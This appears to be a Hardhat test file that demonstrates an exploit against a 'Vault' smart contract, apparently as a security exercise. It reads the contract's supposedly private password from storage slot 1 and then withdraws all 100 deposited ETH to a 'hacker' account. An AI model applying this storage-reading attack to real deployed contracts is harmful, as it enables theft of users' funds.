const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("Vault Private Attack", function () {
  let owner, hacker;

  beforeEach(async() => {
    [owner, hacker] = await ethers.getSigners();
    const vault_artifacts = await ethers.getContractFactory("Vault", owner);
   
    this.vault_contract = await vault_artifacts.deploy(ethers.utils.formatBytes32String("blockmonkey"));
    await this.vault_contract.deposit({ value : ethers.utils.parseEther("100") });
  })

  it("Secret Theif", async() => {
    const secret = await ethers.provider.getStorageAt(this.vault_contract.address, 1);
    const secretToString = await ethers.utils.parseBytes32String(secret);

    console.log("bytes Secret : ", secret);
    console.log("secretToString : ", secretToString);

    expect(secretToString).to.eq("blockmonkey");
  })

  it("Withdraw with Secret", async () => {
    let balanceOfContract_init = await ethers.provider.getBalance(this.vault_contract.address);
    let balanceOfHacker_init = await ethers.provider.getBalance(hacker.address);

    const secret = await ethers.provider.getStorageAt(this.vault_contract.address, 1);

    await this.vault_contract.connect(hacker).withdraw(secret);

    let balanceOfContract_final = await ethers.provider.getBalance(this.vault_contract.address);
    let balanceOfHacker_final = await ethers.provider.getBalance(hacker.address);

    console.log(`balanceOfContract_init : `, ethers.utils.formatEther(balanceOfContract_init.toString()));
    console.log("balanceOfHacker_init :" , ethers.utils.formatEther(balanceOfHacker_init).toString());
    console.log(`===========================Before & After====================================`);
    console.log(`balanceOfContract_init : `, ethers.utils.formatEther(balanceOfContract_final));
    console.log("balanceOfHacker_init :" , ethers.utils.formatEther(balanceOfHacker_final));

    expect(ethers.utils.formatEther(balanceOfContract_init.toString())).to.eq("100.0");
    expect(balanceOfContract_final).to.eq(0);
    expect(balanceOfHacker_final).to.be.gt(balanceOfHacker_init);
  });
});